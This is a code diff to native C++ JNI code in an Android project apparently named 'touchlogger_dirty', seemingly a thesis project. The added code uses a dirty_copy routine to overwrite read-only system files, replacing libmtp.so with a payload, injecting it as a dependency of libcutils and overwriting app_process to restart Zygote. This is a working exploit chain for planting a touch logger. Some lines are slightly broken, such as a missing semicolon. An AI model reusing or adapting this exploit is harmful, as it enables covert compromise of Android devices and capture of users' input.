@@ -8,35 +8,117 @@
 #include "dirty_copy.h"
 #include "file_utils.h"
 
-extern "C"
-JNIEXPORT void JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_restartZygote(JNIEnv *env,
-                                                                     jclass type,
-                                                                     jstring garbagePath_,
-                                                                     jstring backupPath_)
-{
-  const char *garbagePath = env->GetStringUTFChars(garbagePath_, 0);
-  const char *backupPath = env->GetStringUTFChars(backupPath_, 0);
-
-  if (fork() == 0)
-  {
 #ifdef __aarch64__
-    const char* app_process_path = "/system/bin/app_process64";
+#define APP_PROCESS_PATH "/system/bin/app_process32"
 #else
-    const char *app_process_path = "/system/bin/app_process32";
+#define APP_PROCESS_PATH "/system/bin/app_process32"
 #endif
 
+#define LIBCUTILS_PATH "/system/lib/libcutils.so"
+#define LIBMTP_PATH "/system/lib/libmtp.so"
+#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
+
+char app_process_backup_path[PATH_MAX];
+char libcutils_backup_path[PATH_MAX];
+char libmtp_backup_path[PATH_MAX];
+char shared_payload_path[PATH_MAX];
+char exec_payload_path[PATH_MAX];
+
+extern "C"
+JNIEXPORT jboolean JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepare(JNIEnv* env, jclass type,
+                                                               jstring localPath_)
+{
+  const char* localPath = env->GetStringUTFChars(localPath_, 0);
+
+  snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
+  snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
+  snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
+  snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");
+  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");
+
+  LOGV("Backup libmtp...");
+  if (copy_file_with_mode(LIBMTP_PATH, libmtp_backup_path, 0777) == -1)
+  {
+    LOGV("Failed!");
+    return (jboolean) false;
+  }
+  LOGV("Done!");
+
+  LOGV("Backup libcutils...");
+  if (copy_file_with_mode(LIBCUTILS_PATH, libcutils_backup_path, 0777) == -1)
+  {
+    LOGV("Failed!");
+    return (jboolean) false;
+  }
+  LOGV("Done!");
+
+  LOGV("Backup app_process...");
+  if (copy_file_with_mode(APP_PROCESS_PATH, app_process_backup_path, 0777) == -1)
+  {
+    LOGV("Failed!");
+    return (jboolean) false;
+  }
+  LOGV("Done!");
+
+  LOGV("Move exec_payload to external memory...");
+  if (copy_file(exec_payload_path, EXEC_PAYLOAD_SDCARD_PATH) == -1)
+  {
+    LOGV("Failed!");
+    return (jboolean) false;
+  }
+  LOGV("Done!");
+
+  LOGV("Replace libmtp...");
+  if (dirty_copy(shared_payload_path, LIBMTP_PATH) == -1)
+  {
+    LOGV("Failed!");
+    return (jboolean) false;
+  }
+  LOGV("Done!")
+
+  LOGV("Inject dependency into libcutils...")
+  if (inject_dependency_into_library(LIBCUTILS_PATH, "libmtp.so") == -1)
+  {
+    LOGV("Failed!");
+    LOGV("Temporary fix for test device...");
+    LOGV("Please report if you see this in production version!");
+    // FIXME: Temp fix for my Nexus 5, remove before production code!
+    if (replace_dependency_in_binary(LIBCUTILS_PATH, "libcutils.so", "libmtp.so") == -1)
+    {
+      LOGV("Failed!");
+      return (jboolean) false;
+    }
+  }
+  LOGV("Done!");
+
+  env->ReleaseStringUTFChars(localPath_, localPath);
+
+  return (jboolean) true;
+}
+
+extern "C"
+JNIEXPORT void JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env, jclass type)
+{
+  if (fork() == 0)
+  {
     if (daemon(0, 0) == -1)
     {
       LOGV("Unable to daemonize process: %s!", strerror(errno));
+    }
+    else
+    {
+      LOGV("Start as daemon!");
     }
 
     int killer_pid;
     if ((killer_pid = fork()) == 0)
     {
-      if (dirty_copy(garbagePath, app_process_path) == -1)
+      if (dirty_copy(shared_payload_path, APP_PROCESS_PATH) == -1)
       {
-        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_path, garbagePath);
+        LOGV("Unable to overwrite app_process (%s) with %s!", APP_PROCESS_PATH,
+             shared_payload_path);
         exit(-1);
       }
       else
@@ -52,7 +134,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_restartZygote(JNIEnv *env
 
     LOGV("Zygote is probably dead now");
 
-    if (kill(killer_pid, 9) == -1)
+    if (kill(killer_pid, SIGKILL) == -1)
     {
       LOGV("Unable to kill killer thread: %s", strerror(errno));
     }
@@ -61,7 +143,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_restartZygote(JNIEnv *env
       LOGV("Killer process killed successfully!");
     }
 
-    if (dirty_copy(backupPath, app_process_path) == -1)
+    if (dirty_copy(app_process_backup_path, APP_PROCESS_PATH) == -1)
     {
       LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
       exit(-1);
@@ -69,85 +151,40 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_restartZygote(JNIEnv *env
     else
     {
       LOGV("Zygote successfully restarted!");
+    }
+
+    sleep(10);
+
+    LOGV("Return everything to initial state");
+
+    if (!(killer_pid = fork()))
+    {
+      dirty_copy(shared_payload_path, APP_PROCESS_PATH);
       exit(0);
     }
+    else
+    {
+      sleep(5);
+    }
+
+    LOGV("Wait for it...");
+    sleep(5);
+
+    kill(killer_pid, SIGKILL);
+    LOGV("Done! About to resurrect it");
+
+    dirty_copy(libmtp_backup_path, LIBMTP_PATH);
+    dirty_copy(libcutils_backup_path, LIBCUTILS_PATH);
+    dirty_copy(app_process_backup_path, APP_PROCESS_PATH);
+    LOGV("Done!");
+
+    exit(0);
   }
-
-  env->ReleaseStringUTFChars(garbagePath_, garbagePath);
-  env->ReleaseStringUTFChars(backupPath_, backupPath);
-}
-
-extern "C"
-JNIEXPORT jboolean JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_nativeCopy(JNIEnv *env, jclass type,
-                                                                  jstring srcPath_,
-                                                                  jstring dstPath_)
-{
-  const char *srcPath = env->GetStringUTFChars(srcPath_, 0);
-  const char *dstPath = env->GetStringUTFChars(dstPath_, 0);
-
-  int res = copy_file(srcPath, dstPath);
-
-  env->ReleaseStringUTFChars(srcPath_, srcPath);
-  env->ReleaseStringUTFChars(dstPath_, dstPath);
-
-  return (jboolean) (res == 0);
-}
-
-extern "C"
-JNIEXPORT jboolean JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_injectDependencyIntoLinrary(
-    JNIEnv *env, jclass type, jstring path_, jstring dependencyName_)
-{
-  const char *path = env->GetStringUTFChars(path_, 0);
-  const char *dependencyName = env->GetStringUTFChars(dependencyName_, 0);
-
-  int res = inject_dependency_into_library(path, dependencyName);
-
-  env->ReleaseStringUTFChars(path_, path);
-  env->ReleaseStringUTFChars(dependencyName_, dependencyName);
-
-  return (jboolean) (res == 0);
-}
-
-extern "C"
-JNIEXPORT jboolean JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_replaceDependencyInBinary(
-    JNIEnv *env, jclass type, jstring path_, jstring oldDependency_, jstring newDependency_)
-{
-  const char *path = env->GetStringUTFChars(path_, 0);
-  const char *oldDependency = env->GetStringUTFChars(oldDependency_, 0);
-  const char *newDependency = env->GetStringUTFChars(newDependency_, 0);
-
-  int res = replace_dependency_in_binary(path, oldDependency, newDependency);
-
-  env->ReleaseStringUTFChars(path_, path);
-  env->ReleaseStringUTFChars(oldDependency_, oldDependency);
-  env->ReleaseStringUTFChars(newDependency_, newDependency);
-
-  return (jboolean) (res == 0);
-}
-
-extern "C"
-JNIEXPORT jboolean JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_dirtyCopy(
-    JNIEnv *env, jclass type,
-    jstring srcPath_, jstring dstPath_)
-{
-  const char *srcPath = env->GetStringUTFChars(srcPath_, 0);
-  const char *dstPath = env->GetStringUTFChars(dstPath_, 0);
-
-  int res = dirty_copy(srcPath, dstPath);
-
-  env->ReleaseStringUTFChars(srcPath_, srcPath);
-  env->ReleaseStringUTFChars(srcPath_, dstPath);
-
-  return (jboolean) (res == 0);
 }
 
 extern "C"
 JNIEXPORT jstring JNICALL
-Java_org_leyfer_thesis_touchlogger_1dirty_utils_JNIAPI_stringFromJNI(JNIEnv *env,
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_stringFromJNI(JNIEnv* env,
                                                                      jobject instance)
 {
   std::string hello = "Hello from C++";
